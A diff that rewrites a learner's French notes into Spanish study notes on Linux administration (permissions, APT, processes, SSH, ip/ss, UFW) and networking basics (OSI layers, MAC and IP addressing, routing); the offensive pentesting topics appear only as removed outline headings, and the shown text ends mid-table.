@@ -1,658 +1,778 @@
-## plan
-### I - Linux Fundamentals
-- Les utilisateurs et les droits
-- Installer des programmes avec apt-get
-- Surveiller l'activité du système
-- Exécuter des programmes en arrière-plan
-- La connexion sécurisée à distance avec SSH
-- Analyser le réseau et filtrer le trafic avec un pare-feu
-### II - Network Fundamentals
-#### OSI Model
-- .1. Couche 1 et 2 : communiquer dans un réseau local (LAN)
-- .2. Couche 3 : communiquer entre réseaux
-- .3. Couche 4 : communiquer entre applications
-- .4. Couche 7 : Applications 
-- .5. protocoles DHCP, DNS, et HTTP
-### III - Offensive Pentesting
-#### Attaques
-#### Etapes
-#### .1. Footprinting and Reconnaissance
-#### .2. Scanning Networks
-- Ma machine
-- Scanning
-- Enumeration
-- Vulnerability Analysis
-#### .3. System Hacking
-- Sniffing : Wireshark / Tcpdump
-- Hacking Wireless Networks : Attaques MiTM
-- Malware Threats, Denial-of-Service, Session Hijacking, SQL injection ..
-### IV - Hack the Box
-- Installation
-- Methodo
+# Apuntes 
 
+## I. Fundamentos de Linux
 
+### Usuarios y permisos
 
-# I - Linux Fundamentals
-- [cours openclassroom](https://openclassrooms.com/fr/courses/43538-reprenez-le-controle-a-laide-de-linux/38351-la-structure-des-dossiers-et-fichiers)
-### Les utilisateurs et les droits
-Linux est un système multi-utilisateurs = plusieurs personnes peuvent travailler simultanément sur le même OS, en s'y connectant à distance notamment
+Linux es un sistema **multiusuario**: varias personas pueden utilizar la misma máquina, incluso al mismo tiempo, por ejemplo mediante conexiones remotas.
 
-- **Root** : Il y a un utilisateur « spécial », root, aussi appelé superutilisateur. Celui-ci a tous les droits sur la machine, et que lui a acces a certaines commandes.
-- **Les autres** : On peut créer autant d'utilisateurs que l'on veut, eux-mêmes répartis dans des groupes. Par defaut utilisateur non root car un virus ne peut rien faire de plus que vous quand vous êtes connectés avec des droits limités. Mais si vous êtes en root il pourra tout faire. Sous Windows, vous êtes toujours connectés en administrateur par défaut (équivalent de root), ce qui explique pourquoi les virus y sont si dangereux.
+- **root** es el superusuario. Tiene control total sobre el sistema y puede ejecutar tareas administrativas.
+- Los usuarios normales tienen permisos limitados. Es más seguro trabajar habitualmente con una cuenta sin privilegios, porque un programa malicioso ejecutado con esa cuenta tendrá el mismo alcance limitado que el usuario.
+- Los usuarios pueden pertenecer a grupos, que sirven para gestionar permisos compartidos.
 
-| commande | fonctionnement |
-|----------|-------|
-| sudo *commande*  | devenir root temporairement | 
-| sudo su | devenir root et le rester jusqu'a tapper exit|
-| adduser *nom utilisateur*| ajouter un utilisateur (seul root peut le faire) repertoire dans /home/nomutilisateur|
-| passwd *nom utilisateur* | changer le mot de passe (idem en root)|
+| Comando | Función |
+|---|---|
+| `sudo comando` | Ejecuta un comando temporalmente con privilegios administrativos. |
+| `sudo su` | Abre una sesión como root hasta ejecutar `exit`. |
+| `sudo adduser nombre_usuario` | Crea un usuario y, normalmente, su directorio personal en `/home/nombre_usuario`. |
+| `sudo passwd nombre_usuario` | Cambia la contraseña de un usuario. |
+| `ls -l` | Muestra los permisos, propietario y grupo de archivos y directorios. |
+| `sudo chown nuevo_propietario archivo` | Cambia el propietario de un archivo. |
+| `chmod permisos archivo` | Modifica los permisos de lectura, escritura y ejecución. |
 
-- Chaque fichier et chaque dossier possède une liste de droits (ls -l). C'est une liste qui indique qui a le droit de voir le fichier, de le modifier et de l'exécuter. Root a tous les droits.
+Los permisos se expresan para tres categorías:
 
-| commande | fonctionnement |
-|----------|-------|
-| chown *nom du nouveau proprio* *nom du fichier* | changer le propriétaire d'un fichier (idem en root)|
-| chmod *chiffre* *fichier* | Modifier les droits d'accès (voir readme minishell) |
+- **Usuario propietario**.
+- **Grupo propietario**.
+- **Otros usuarios**.
 
-### Installer des programmes avec apt-get
-Sous Windows, les programmes sont éparpillés aux quatre coins du Net.
-Sous Linux, on a choisi de placer tous les programmes (paquets) au même endroit.L'installation de programmes fonctionne différemment d'une distribution à une autre.
+Por ejemplo:
 
-
-| concept | principe |
-|----------|-------|
-| paquet | Sous Ubuntu, pas de programmes d'installation mais des paquets. Sorte de dossier zippé qui contient tous les fichiers du programme (fichier.deb). Contient toutes les instructions nécessaires pour installer le programme.|
-| depot/repository | Tous les.deb sont rassemblés au même endroit sur un même serveur appelé dépôt. C'est le serveur sur lequel on va télécharger nos paquets. (y en a plein avec les memes packets dessus et on peut changer le serveur sur lequel on recupere nos packets par defaut) |
-|dependance |un paquet peut avoir besoin de plusieurs autres paquets pour fonctionner, on dit qu'il a des dépendances|
-|apt-get | programme de gestion des paquets. Si paquets pas dispo avec apt-get il faudra compiler un programme depuis les sources (avec tar zxvf)|
-
-- **apt-get update** (optionnel) : pour mettre notre cache à jour si ce n'est pas déjà fait ;
-- apt-cache search monpaquet (optionnel) : pour rechercher le paquet que nous voulons télécharger si nous ne connaissons pas son nom exact ;
-- **apt-get install** monpaquet : pour télécharger et installer notre paquet.
-
-### Surveiller l'activité du système
-Linux est un système multi-tâches et multi-utilisateurs : il est capable de gérer plusieurs programmes tournant en même temps + plusieurs personnes peuvent utiliser la même machine en même temps (en s'y connectant via Internet).
-
-Série de commandes qui nous permettront de savoir ce qui se passe actuellement dans notre ordinateur :
-
-| commande | fonctionnement |
-|----------|-------|
-| w | plusieurs infos : La charge avec "load average ..." donne le nombre moyen de processus en train de tourner et qui réclament l'utilisation du processeur. En dessous c'est une ligne par user connecte. FROM (ou DE) indique l'IP (si connecte en local sera :0).  WHAT (ou quoi) la commande qu'il est en train d'exécuter en ce moment. En général, si vous voyez bash, cela signifie que l'invite de commandes est ouverte et qu'aucune commande particulière n'est exécutée.|
-| who | Lui aussi donne la liste des connectes |
-| ps | obtenir la liste des processus qui tournent au moment où vous lancez la commande et sur l'utilisateur sur lequel on est. Cette liste n'est pas actualisée en temps réel |
-|ps -ef|  la liste de tous les processus lancés par tous les utilisateurs sur toutes les consoles |
-|ps -ejH | afficher les processus en arbre, pour savoir quel processus enfant appartient a quel parent |
-|top | processus en temps reel. En haut y a l'uptime et la charge, mais aussi la quantité de processeur et de mémoire utilisée (voir man plein de speficites)|
-|sudo halt| arreter l'ordinateur|
-|sudo reboot| redemarrer l'ordinateur|
-
-
-### Exécuter des programmes en arrière-plan
-Plusieurs programmes peuvent tourner en même temps au sein d'une même console. 
-
-| commande | fonctionnement |
-|----------|-------|
-| & | rajouter le petit symbole & à la fin de la commande que vous voulez envoyer en arrière-plan. Exemple : cp video.avi copie_video.avi & |
-|nohup |détacher le processus de la console, meme si on quitte la console ca kill pas le processus. Exemple : nohup cp video.avi copie_video.avi. La sortie de la commande est par défaut redirigée vers un fichiernohup.out|
-|Ctrl + Z puis bg| mettre en pause l'exécution du programme qui est en premier plan puis le passer en arriere plan avec bg|
-| jobs | connaître les processus qui tournent en arrière-plan|
-|fg | reprendre un processus au premier plan|
-
-### La connexion sécurisée à distance avec SSH
-
-Toutes les machines sous Linux peuvent être configurées pour que l'on s'y connecte à distance, pour peu qu'elles restent allumées.
-
-- Pourquoi faut-il sécuriser les échanges ?
-Comme on ne peut pas complètement empêcher quelqu'un d'intercepter les données qui transitent sur l'internet (par exemple avec wireshark), il faut trouver un moyen pour que le client et le serveur communiquent de manière sécurisée. Le chiffrement sert précisément à ça : si le pirate récupère le mot de passe chiffré, il ne peut rien en faire.
-
-- Comment fait SSH pour sécuriser les échanges ?
-Il existe des tonnes d'algorithmes de chiffrement classables en deux categories : les chiffrements symétriques (une seule cle) et les chiffrements asymétriques (cle privee + cle publique). SSH = utilise d'abord le chiffrement asymétrique pour s'échanger discrètement une clé secrète de chiffrement symétrique. Ensuite, on utilise tout le temps la clé de chiffrement symétrique pour chiffrer les échanges.
-
-- Comment utiliser SSH concrètement ?
-Si vous voulez accéder à votre PC depuis un autre lieu (et donc suivre le reste de ce chapitre), vous devez le transformer en serveur au préalable.
-```
-##creer le serveur :
-sudo apt-get install openssh-server
-sudo /etc/init.d/ssh start #normalement pas besoin serveur ssh lance au demarrage
-```
-Puis pour s'y connecter, l'authentification par mot de passe ou l'authentification par clés publique et privée du client (ssh-keygen).
-```
-###s'y connecter a partir d'une machine Linux :
-ssh *login*@*adresseipdemonordi* #verifier que le port 22 n'est pas bloque par un parefeu
-# on va nous demander notre mot de passe
+```bash
+chmod 755 script.sh
 ```
 
-### Analyser le réseau et filtrer le trafic avec un pare-feu
+Significa:
 
-#### 1. Lorsque vous êtes connectés à l'internet, vous avez régulièrement des applications qui vont se connecter puis télécharger et envoyer des informations. Comment surveiller ce qui se passe ? Quelle application est en train de communiquer et sur quel port ?
+- propietario: lectura, escritura y ejecución;
+- grupo: lectura y ejecución;
+- otros: lectura y ejecución.
 
+***
 
-Chaque IP est associee a un hostname (= nom en toutes lettres plus facile à mémoriser et qui revient exactement au même que d'écrire l'adresse IP). L'association des 2 est faite par les serveurs DNS. Si je tappe siteduzero.com dans mon navigateur je tombe sur openclassroom, plus facile que de retenir l'adresse ip.
+### Instalar programas con APT
 
+En distribuciones basadas en Debian, como Ubuntu o Kali Linux, el software se gestiona mediante paquetes.
 
-| commande | fonctionnement |
-|----------|-------|
-| host *google.fr*  | nous indique ladresse IP du hostname google.fr | 
-| whois *siteduzero.com* | permet d'obtenir toutes les infos sur un nom de domaine (prenom, adresse ...) |
-| ifconfig | permet de gérer les connexions réseau de votre machine|
-| netstat | permet d'analyser ces connexions, de connaître des statistiques, etc |
+| Concepto | Explicación |
+|---|---|
+| Paquete | Archivo que contiene el programa, sus archivos y la información necesaria para instalarlo. En Debian suele tener extensión `.deb`. |
+| Repositorio | Servidor o colección de servidores desde donde se descargan los paquetes. |
+| Dependencia | Paquete adicional que otro programa necesita para funcionar correctamente. |
+| APT | Herramienta de administración de paquetes que resuelve dependencias e instala, actualiza o elimina software. |
 
+Comandos habituales:
 
-**ifconfig** :
-- liste les interfaces reseau (eth0, lo ...) et permet de faire des reglages reseau (par exemple desactivier l'interface eth0 : ifconfig eth0 down)
-- lo : c'est la boucle locale. Tout le monde doit l'avoir c'est connexion a nous meme
-- packets *un chiffre pas egal a 0* indique l'interface active la plus utilisee 
-
-Sur mac :
-```
-#ap1: Access Point. This is used if you are using your MacBook as a wireless host where you are sharing its connection
-
-#en0 at one point "ethernet", now is WiFi = wireless connection
-#en1 is an ordinary ethernet connection
-#en2 
-#en3 is a connection using a Thunderbolt-to-ethernet adapter (adaptateur sur le mac)
-
-#p2p0 : interface pour AirDrop (le p2p apple)
-#awdl0: Apple Wireless Direct Link. WIFI p2p connection for things like AirDrop, Airplay, etc. Also used for Bluetooth
-
-#bridged0 : un pont quelconque entre deux interfaces, possiblement du vmware
-#fw0 is the FireWire network interface
-#utun0: Tunneling interface. Used for VPN connections to tunnel traffic or for software like Back To My Mack.
+```bash
+sudo apt update
 ```
 
-**netstat** :
-- netstat permet d'analyser ces connexions, de connaître des statistiques, etc.
-- netstat -i : tableau présentant, pour chaque interface réseau que vous avez, une série de statistiques d'utilisation.
-- netstat -uta : lister toutes les connexions ouvertes. Ce tableau vous indique qui, depuis l'adresse locale, est connecté à qui (à une adresse distante).
-- netstat -ta : idem que -uta mais on enleve les connexions UDP.
-- l'etat LISTEN : à l'écoute des connexions entrantes.
-- l'etat ESTABLISHED : la connexion a été établie avec l'ordinateur distant
-- regarder les ports sur lesquels ces connexions ecoutent (après le symbole « : » dans colonne "adresse locale") : on peut se connecter à chaque ordinateur via différentes « portes » appelées ports. Chaque service utilise un port différent (page web 80, fichier transfert 21, email 110). Ouvrir une page web et y aura plein de connexions established
+Actualiza la lista local de paquetes disponibles en los repositorios.
 
-
-#### 2. Savoir paramétrer un pare-feu est essentiel : Configurer le parefeu iptables
-
-- Il permet d'établir un certain nombre de règles pour dire par quels ports on peut se connecter à votre ordinateur, mais aussi à quels ports vous avez le droit de vous connecter. Notre objectif est de bloquer par défaut toutes ces portes et d'autoriser seulement celles dont vous avez besoin, que vous considérez comme « sûres » et que vous utilisez. Par exemple, le port 80 utilisé pour le web est un port sûr que vous pouvez activer.
-- Avoir un pare-feu ne vous prémunit pas contre les virus. En revanche, cela rend la tâche particulièrement difficile aux pirates qui voudraient accéder à votre machine.
-- voir toutes les regles de config sur openclassroom
-
-- [Tryhackme](https://tryhackme.com/room/linuxfundamentalspart1)
-
-# II - Network Fundamentals
-- [Tryhackme](https://tryhackme.com/paths)
-- [openclassroom](https://openclassrooms.com/fr/courses/857447-apprenez-le-fonctionnement-des-reseaux-tcp-ip/853038-le-materiel-de-couche-2-le-commutateur)
-
-### OSI Model
-Le modèle OSI est une norme qui préconise comment les ordinateurs devraient communiquer entre eux. Modèle a 7 couches. Pour communiquer par courrier il faut un émetteur, récepteur, support de transmission (lettre) etc. Les chercheurs ont imaginé 7 éléments a mettre en place pour communiquer sur internet.
-
-- La couche 1 ou **couche physique** :
-Nom : physique.
-Rôle : offrir un support de transmission pour la communication.
-Rôle secondaire : RAS.
-Matériel associé : le hub, ou concentrateur en français.
-- La couche 2 ou **couche liaison** :
-Nom : liaison de données.
-Rôle : connecter les machines entre elles sur un réseau local.
-Rôle secondaire : détecter les erreurs de transmission.
-Matériel associé : le switch, ou commutateur.
-- La couche 3 ou **couche réseau** :
-Nom : réseau.
-Rôle : interconnecter les réseaux entre eux.
-Rôle secondaire : fragmenter les paquets.
-Matériel associé : le routeur.
-- La couche 4 ou **couche transport** :
-Nom : transport.
-Rôle : gérer les connexions applicatives.
-Rôle secondaire : garantir la connexion.
-Matériel associé : RAS.
-- couche 5 et 6 : Modèle OSI = modèle théorique. Le modèle sur lequel s'appuie Internet aujourd'hui est le modèle TCP/IP. Or, ce modèle n'utilise pas les couches 5 et 6, donc... on s'en fiche !
-- La couche 7 ou **couche application** :
-Nom : application.
-Rôle : RAS.
-Rôle secondaire : RAS.
-Matériel associé : le proxy.
-
-Le modèle OSI ajoute deux règles :
-
---> chaque couche est indépendante : exemple, l'adresse IP qui est une adresse de couche 3 ne pourra pas être utilisée par une autre couche.
-
---> chaque couche ne peut communiquer qu'avec une couche adjacente : Si on entre l'adresse d'un site dans la barre de recherche. L'application (le navigateur) de couche 7, s'est adressé a la couche du dessous, on a parcouru les couches du modèle OSI de haut en bas.
-
-L'encapsulation : un message est envoyé depuis la couche 7 du modèle OSI, et il traverse toutes les couches jusqu'à arriver à la couche 1 pour être envoyé sur le réseau. En fait, un en-tête va être ajouté à chaque passage par une couche. Au passage par la couche 4, on ajoutera l'en-tête de couche 4, puis celui de couche 3 en passant par la couche 3, et ainsi de suite. On encapsule un message dans un autre.  ce qui va circuler sur le réseau est une trame de couche 2, qui contient le datagramme de couche 3 (qui lui-même contiendra l'élément de couche 4).
-
-#### 1. Couche 1 et 2 : communiquer dans un réseau local (LAN)
-
-|couche| 1 |
-|------|----|
-| role | brancher les machines = acheminer des signaux électriques, des 0 et des 1 en gros. |
-|fonctionnement | Les 0 et les 1 vont circuler grâce aux différents supports de transmission. Les câbles coaxiaux, la fibre optique. |
-| topologie | Y a differents moyens de brancher les machines entre elles (la topologie en bus, la topologie en anneau, la topologie en étoile). |
-
-|couche| 2 |
-|------|----|
-| role | faire communiquer les machines qui sont branchées sur un réseau local.|
-| identifiant | Chaque machine a une adresse MAC. L'adresse MAC est l'adresse d'une carte réseau (carte reseau contenue dans la machine). |
-| protocole | Étant donné que nous discutons entre des machines très différentes, qui ont des OS différents, nous devons créer un langage de communication commun pour se comprendre (= protocole). Le protocole le + utilise sur la couche 2 est le protocole Ethernet. |
-| fonctionnement protocole | Nous avons vu que des 0 et des 1 allaient circuler sur nos câbles. Nous allons donc recevoir des choses du genre : 001101011110001100100011111000010111000110001... Ce qui ne veut pas dire grand-chose tant que nous ne nous entendons pas sur leur signification. Le protocole va définir quelles informations vont être envoyées, et dans quel ordre. Par exemple on peut dire que les 48 premiers caractères que nous allons recevoir représentent l'adresse MAC de l'émetteur (puisque l'adresse MAC fait 48 bits) les 48 suivants l'adresse du récepteur, puis enfin le message. Le protocole va définir le format des messages envoyés sur le réseau. |
-| nom des messages | Ce message est appelle une trame. La trame est le message envoyé sur le réseau, en couche 2. |
-| materiel| Le commutateur (= switch) est un matériel qui va pouvoir nous permettre de relier plusieurs machines entre elles. Nous allons donc brancher nos machines au switch, voire d'autres switchs à notre switch. Pour envoyer la trame vers la bonne machine, le switch se sert de l'adresse MAC destination contenue dans l'en-tête de la trame.|
-
---> Pour l'IP privee : au sein d'un même réseau, chaque machine possède une et une seule adresse IP
-
---> Pour l'IP publique : ordinateurs d'un meme reseau prive partagent une adresse publique (si on fait un test via un site What Is My IP? le site interrogera votre routeur ou votre Box et pas vos machines donc renverra l'IP publique).
-
---> Les adresses IP privees sont differentes entre une VM et mon pc
-
-#### 2. Couche 3 : communiquer entre réseaux
-
-Comment envoyer un message à un réseau auquel on est pas directement reliés ? Les réseaux sont tous reliés entre eux, comme une chaîne. Internet est un ensemble de réseaux collés les uns aux autres. Pour voir par quelles machines on passe pour aller jusqu'a une machine :
+```bash
+apt search nombre_paquete
 ```
+
+Busca paquetes por nombre o descripción.
+
+```bash
+sudo apt install nombre_paquete
+```
+
+Instala un paquete.
+
+```bash
+sudo apt remove nombre_paquete
+```
+
+Desinstala un paquete, conservando normalmente algunos archivos de configuración.
+
+```bash
+sudo apt autoremove
+```
+
+Elimina dependencias que ya no utiliza ningún paquete instalado.
+
+Aunque aún se ve `apt-get` en documentación antigua, en uso interactivo moderno suele preferirse `apt`.
+
+***
+
+### Supervisar la actividad del sistema
+
+Linux permite ejecutar muchos procesos y gestionar múltiples usuarios de forma simultánea. Estos comandos ayudan a comprobar qué ocurre en la máquina:
+
+| Comando | Función |
+|---|---|
+| `w` | Muestra usuarios conectados, carga del sistema y lo que ejecutan. |
+| `who` | Lista los usuarios conectados. |
+| `ps` | Muestra procesos asociados a la terminal o usuario actual. |
+| `ps -ef` | Lista procesos de todos los usuarios. |
+| `ps -ejH` | Muestra los procesos en forma de árbol jerárquico. |
+| `top` | Monitoriza procesos, CPU, memoria y carga del sistema en tiempo real. |
+| `htop` | Alternativa visual e interactiva a `top`, si está instalada. |
+| `sudo halt` | Detiene el sistema. |
+| `sudo reboot` | Reinicia el sistema. |
+
+En `w` y `top`, el valor de *load average* indica cuántas tareas están ejecutándose o esperando tiempo de CPU. No debe interpretarse aislado: hay que compararlo con el número de núcleos disponibles en el equipo.
+
+***
+
+### Ejecutar procesos en segundo plano
+
+Un proceso en primer plano ocupa la terminal hasta que finaliza. Para poder seguir utilizando la terminal, se puede ejecutarlo en segundo plano.
+
+| Método | Función |
+|---|---|
+| `comando &` | Inicia un proceso en segundo plano. |
+| `nohup comando &` | Evita que el proceso se cierre al terminar la sesión de terminal. |
+| `Ctrl + Z` | Suspende temporalmente el proceso en primer plano. |
+| `bg` | Reanuda un proceso suspendido en segundo plano. |
+| `jobs` | Muestra los trabajos asociados a la terminal actual. |
+| `fg` | Devuelve un trabajo al primer plano. |
+
+Ejemplos:
+
+```bash
+cp video.avi copia_video.avi &
+```
+
+```bash
+nohup python3 servidor.py &
+```
+
+La salida de `nohup` se redirige normalmente al archivo `nohup.out` si no se especifica otro destino.
+
+***
+
+### Conexión remota segura con SSH
+
+SSH permite acceder de forma remota a otra máquina y administrar servidores mediante una conexión cifrada.
+
+Su seguridad se basa en:
+
+1. **Autenticación del servidor**, para comprobar que te conectas al equipo esperado.
+2. Intercambio de claves y negociación de algoritmos.
+3. Cifrado simétrico de la sesión una vez acordada una clave compartida.
+4. Protección de la integridad de los datos para detectar modificaciones durante la transmisión. [openssh](https://www.openssh.org/manual.html)
+
+Instalación del servidor SSH en sistemas Debian/Ubuntu:
+
+```bash
+sudo apt update
+sudo apt install openssh-server
+sudo systemctl enable --now ssh
+```
+
+Comprobar su estado:
+
+```bash
+sudo systemctl status ssh
+```
+
+Conectarse desde otra máquina:
+
+```bash
+ssh usuario@direccion_ip
+```
+
+Ejemplo:
+
+```bash
+ssh leo@192.168.1.50
+```
+
+El puerto predeterminado de SSH es el 22. Si el servidor está detrás de un cortafuegos, ese puerto debe estar permitido solo cuando sea necesario.
+
+#### Autenticación mediante claves
+
+En lugar de utilizar contraseña, es recomendable usar claves pública y privada:
+
+```bash
+ssh-keygen
+```
+
+Después, se copia la clave pública al servidor:
+
+```bash
+ssh-copy-id usuario@direccion_ip
+```
+
+La clave privada debe mantenerse siempre secreta. La pública puede instalarse en los servidores a los que quieras acceder.
+
+***
+
+### Analizar conexiones y tráfico de red
+
+Un nombre de dominio, como `google.com`, es más fácil de recordar que una dirección IP. El DNS se encarga de resolver nombres de dominio a direcciones IP.
+
+| Comando | Función |
+|---|---|
+| `host google.com` | Consulta la resolución DNS de un dominio. |
+| `dig google.com` | Realiza consultas DNS más detalladas. |
+| `ip addr` | Muestra interfaces y direcciones IP. |
+| `ip link` | Muestra interfaces de red. |
+| `ip route` | Muestra la tabla de rutas. |
+| `ss -tulpn` | Muestra puertos y sockets en escucha. |
+| `netstat` | Herramienta antigua para analizar conexiones; hoy suele sustituirse por `ss`. |
+| `whois dominio.com` | Consulta datos de registro de un dominio, cuando estén disponibles. |
+
+`ifconfig` y `netstat` todavía aparecen en muchos apuntes, pero en distribuciones Linux actuales suelen considerarse herramientas heredadas. Es preferible utilizar `ip` y `ss`.
+
+Ejemplos:
+
+```bash
+ip addr
+ip route
+ss -tulpn
+```
+
+Estados frecuentes de TCP:
+
+- `LISTEN`: un servicio está esperando conexiones entrantes.
+- `ESTABLISHED`: existe una conexión activa entre dos extremos.
+- `TIME-WAIT`: la conexión se ha cerrado, pero el sistema mantiene temporalmente su estado para asegurar un cierre correcto.
+
+Un puerto es un identificador lógico de una aplicación o servicio dentro de una máquina. Algunos puertos habituales son:
+
+| Servicio | Puerto habitual |
+|---|---:|
+| SSH | 22 |
+| HTTP | 80 |
+| HTTPS | 443 |
+| SMTP | 25 |
+| DNS | 53 |
+| FTP | 21 |
+| IMAP | 143 o 993 con TLS |
+| Proxy HTTP | 8080, aunque puede variar |
+
+***
+
+### Cortafuegos
+
+Un cortafuegos filtra conexiones entrantes y salientes según reglas. Su objetivo es reducir la superficie de exposición: permitir únicamente el tráfico estrictamente necesario.
+
+En sistemas actuales puedes encontrar:
+
+- `nftables`, la arquitectura moderna de filtrado en Linux.
+- `iptables`, herramienta histórica todavía muy presente.
+- `ufw`, interfaz simplificada habitual en Ubuntu.
+- `firewalld`, frecuente en Fedora, RHEL y distribuciones relacionadas.
+
+Ejemplo básico con UFW:
+
+```bash
+sudo ufw default deny incoming
+sudo ufw default allow outgoing
+sudo ufw allow 22/tcp
+sudo ufw enable
+sudo ufw status verbose
+```
+
+Esto bloquea por defecto conexiones entrantes, permite conexiones salientes y autoriza SSH por el puerto 22. Un cortafuegos no sustituye las actualizaciones, las contraseñas robustas, el control de accesos ni una configuración segura de los servicios.
+
+***
+
+## II. Fundamentos de redes
+
+### Modelo OSI
+
+El modelo OSI divide la comunicación de red en siete capas. Es un modelo conceptual que ayuda a entender la función de cada tecnología.
+
+| Capa | Nombre | Función principal | Ejemplos |
+|---:|---|---|---|
+| 7 | Aplicación | Servicios utilizados por aplicaciones. | HTTP, DNS, SMTP |
+| 6 | Presentación | Formato, cifrado y compresión de datos. | TLS, codificación |
+| 5 | Sesión | Establecimiento y gestión de sesiones. | Control de sesiones |
+| 4 | Transporte | Comunicación entre procesos y aplicaciones. | TCP, UDP |
+| 3 | Red | Enrutamiento entre redes. | IP, ICMP, routers |
+| 2 | Enlace de datos | Comunicación dentro de una red local. | Ethernet, MAC, switches |
+| 1 | Física | Transmisión de bits por el medio físico. | Cable, fibra, radio, conectores |
+
+En la práctica, Internet se basa principalmente en el modelo TCP/IP, que agrupa varias capas del modelo OSI.
+
+### Encapsulación
+
+Cuando una aplicación envía datos por la red, la información baja por las capas. Cada capa añade información de control, normalmente una cabecera.
+
+Por ejemplo, al cargar una web:
+
+1. La aplicación genera una solicitud HTTP.
+2. TCP o UDP añade información de transporte, incluidos puertos.
+3. IP añade direcciones IP de origen y destino.
+4. Ethernet añade direcciones MAC para el siguiente salto local.
+5. La capa física transmite los bits por cable, fibra o Wi-Fi.
+
+En el receptor sucede el proceso inverso, denominado desencapsulación.
+
+***
+
+### Capa 1: física
+
+La capa física transporta bits mediante señales eléctricas, ópticas o de radio.
+
+Incluye elementos como:
+
+- cable Ethernet;
+- fibra óptica;
+- señales Wi-Fi;
+- conectores;
+- repetidores y hubs antiguos;
+- características físicas de transmisión.
+
+Las topologías más conocidas son:
+
+- **Bus**: todos los equipos comparten un mismo medio.
+- **Anillo**: los equipos forman un circuito.
+- **Estrella**: los dispositivos se conectan a un punto central, normalmente un switch.
+- **Malla**: existen múltiples conexiones entre nodos para aumentar redundancia.
+
+Actualmente, la topología en estrella es habitual en redes Ethernet domésticas y empresariales.
+
+***
+
+### Capa 2: enlace de datos
+
+La capa de enlace permite la comunicación dentro de una red local o LAN.
+
+- Cada interfaz de red tiene una dirección MAC.
+- Ethernet es el protocolo más usado en redes cableadas.
+- La unidad de datos de esta capa se llama **trama**.
+- Un switch conecta dispositivos de una LAN y reenvía tramas según la dirección MAC de destino.
+
+Una dirección MAC suele tener 48 bits y se representa en hexadecimal, por ejemplo:
+
+```text
+00:1A:2B:3C:4D:5E
+```
+
+El switch aprende qué direcciones MAC están asociadas a cada puerto observando las tramas que recibe. Así puede enviar una trama únicamente por el puerto adecuado en vez de reenviarla a todos los dispositivos.
+
+***
+
+### Direcciones IP privadas y públicas
+
+Las direcciones IP privadas se utilizan dentro de redes locales y no se enrutan directamente por Internet.
+
+Rangos IPv4 privados:
+
+| Rango | Bloque CIDR |
+|---|---|
+| 10.0.0.0 – 10.255.255.255 | `10.0.0.0/8` |
+| 172.16.0.0 – 172.31.255.255 | `172.16.0.0/12` |
+| 192.168.0.0 – 192.168.255.255 | `192.168.0.0/16` |
+
+Los dispositivos de una casa suelen tener IP privadas, mientras que el router dispone de una IP pública visible desde Internet. Normalmente utiliza NAT para traducir las conexiones internas y permitir que varios equipos compartan una misma IP pública.
+
+Una máquina virtual puede tener una IP distinta de la máquina anfitriona, dependiendo de su configuración de red:
+
+- **NAT**: la máquina virtual sale a Internet mediante la conexión del anfitrión.
+- **Adaptador puente**: la máquina virtual aparece como otro dispositivo de la misma red local.
+- **Red interna o solo-anfitrión**: útil para laboratorios aislados.
+
+***
+
+### Capa 3: red
+
+La capa de red permite comunicar redes diferentes. Su protocolo principal es IP.
+
+| Elemento | Función |
+|---|---|
+| Dirección IP | Identifica una interfaz dentro de una red. |
+| Máscara de subred o prefijo CIDR | Distingue la parte de red y la parte de host de una IP. |
+| Router | Reenvía paquetes entre redes. |
+| Tabla de rutas | Indica qué camino o puerta de enlace usar para llegar a otros destinos. |
+| Paquete o datagrama IP | Unidad de datos de la capa IP. |
+
+Ejemplo:
+
+```text
+IP:      192.168.0.1
+Máscara: 255.255.0.0
+```
+
+En binario:
+
+```text
+255.255.0.0  = 11111111.11111111.00000000.00000000
+192.168.0.1  = 11000000.10101000.00000000.00000001
+```
+
+La máscara indica qué bits pertenecen a la red. En este caso, el prefijo es `/16`, por lo que la red es:
+
+```text
+192.168.0.0/16
+```
+
+Comandos actuales para consultar la configuración:
+
+```bash
+ip addr
+ip route
+```
+
+Ejemplo de ruta por defecto:
+
+```text
+default via 192.168.1.1 dev wlan0
+```
+
+Esto significa que el tráfico destinado a redes desconocidas se enviará al router `192.168.1.1`.
+
+Para observar los saltos de red hasta un destino:
+
+```bash
+traceroute example.com
+```
+
+En algunas distribuciones puede ser necesario instalarlo:
+
+```bash
 sudo apt install traceroute
-traceroute www.siteduzero.com #chacune des lignes correspond à une machine que nous avons rencontrée
 ```
 
-|couche| 3 |
-|------|----|
-| role | Communiquer entre réseaux|
-| identifiant | Adresse IP : l'adresse IP est en fait l'adresse du réseau ET de la machine. Une partie de l'adresse IP représentera l'adresse du réseau, et l'autre partie l'adresse de la machine. C'est le masque qui va indiquer quelle est la partie réseau de l'adresse, et quelle est la partie machine. |
-| protocole | le protocole IP, ou Internet Protocol. (mais y a aussi d'autres protocoles : ICMP, ARP...)|
-| nom des messages | Pour le protocole IP, le message s'appelle un datagramme ou un paquet. (qui contiendra l'IP source et l'IP de la machine de destination)|
-| materiel| routeur : va nous permettre d'envoyer un message en dehors de notre réseau. C'est une machine qui a plusieurs interfaces (plusieurs cartes réseau), chacune reliée à un réseau. Son rôle va être d'aiguiller les paquets reçus entre les différents réseaux, se différencie d'une simple machine, car il accepte de relayer des paquets qui ne lui sont pas destinés. Aiguille les paquets grâce à sa table de routage qui indique quelle passerelle utiliser pour joindre un réseau.|
+***
 
+### Capa 4: transporte
 
-```
-# Exemple : on associe l'adresse IP 192.168.0.1 au masque 255.255.0.0.
-255.255.0.0 -> 11111111.11111111.00000000.00000000  #tous les bits a 1 = la partie reseau
-192.168.0.1 -> 11000000.10101000.00000000.00000001  #tous les bits à 0 = la partie machine de l'adresse
-# Donc la partie réseau de l'adresse est 192.168, et la partie machine est 0.1.
-```
+La capa de transporte permite que las aplicaciones se comuniquen entre sí mediante puertos.
 
-```
-route -n # afficher la table de routage
-## La première ligne est pour notre réseau, et on voit une particularité de Linux qui n'indique pas notre adresse, mais 0.0.0.0. C'est comme ça.
-La seconde est la route par défaut qui est ici 88.191.45.1.
-route del default # enlever la route par defaut
-route add default gw 10.0.0.254 # changer la route par defaut pour 10.0.0.254
-route add -net 192.168.0.0 netmask 255.255.255.0 gw 10.0.0.253 #ajouter une route spécifique si nous le souhaitons pour aller vers le réseau 192.168.0.0/24 en passant par la passerelle 10.0.0.253
-```
+| Protocolo | Características | Usos habituales |
+|---|---|---|
+| TCP | Orientado a conexión, fiable, ordenado y con control de errores. | Web, SSH, correo, transferencia de archivos. |
